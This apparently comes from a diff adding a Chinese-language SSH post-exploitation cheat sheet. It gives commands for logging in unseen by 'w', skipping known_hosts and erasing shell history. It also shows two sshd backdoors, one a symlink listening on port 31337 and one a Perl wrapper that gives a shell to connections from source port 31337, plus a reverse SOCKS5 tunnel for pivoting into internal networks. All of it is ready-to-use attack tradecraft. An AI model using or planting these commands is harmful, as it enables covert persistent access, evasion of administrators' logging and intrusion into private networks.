@@ -1,0 +1,46 @@
+我一般先这么登录，不让对方执行w的时候看到我
+<code>
+ssh -T root@8.8.8.8 bin/sh -i
+</code>
+
+还有一个技巧：远程登录时防止被记录到know_hosts文件（默认为~/.ssh/know_hosts）
+<code>
+ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i
+</code>
+
+远程登录SSH后第一件事
+<code>
+unset HISTFILE;export HISTFILE=;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace
+</code>
+
+常见的两种方法建立SSH后门
+
+1.后门端口为31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆
+<code>
+mickey@vic:~# ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;
+</code>
+
+2.使用源端口31337登录，就可以获得SHELL，端口还是默认的SSH端口
+<code>
+[root@localhost ~]# cd /usr/sbin
+[root@localhost sbin]# mv sshd ../bin
+[root@localhost sbin]# echo '#!/usr/bin/perl' >sshd
+[root@localhost sbin]# echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
+[root@localhost sbin]# echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
+[root@localhost sbin]# chmod u+x sshd
+[root@localhost sbin]# /etc/init.d/sshd restart
+</code>
+
+用SSH做socks5代理，并且转发到公网的IP
+<code>
+ssh -fND 127.0.0.1:8888 mickey@127.0.0.1   
+</code>
+做SOCKS5代理,这里需要提供一个SSH登录账号
+
+<code>
+ssh -fNR 8888:127.0.0.1:8888 mickey@8.8.8.8
+</code>
+把socks5代理反弹到你公网的SSH服务器，这里输入的是你公网SSH服务器的vpn用户的密码
+
+最后在本地设置SOCKS5代理，127.0.0.1:8888 
+就能连接内网任意的服务器了。
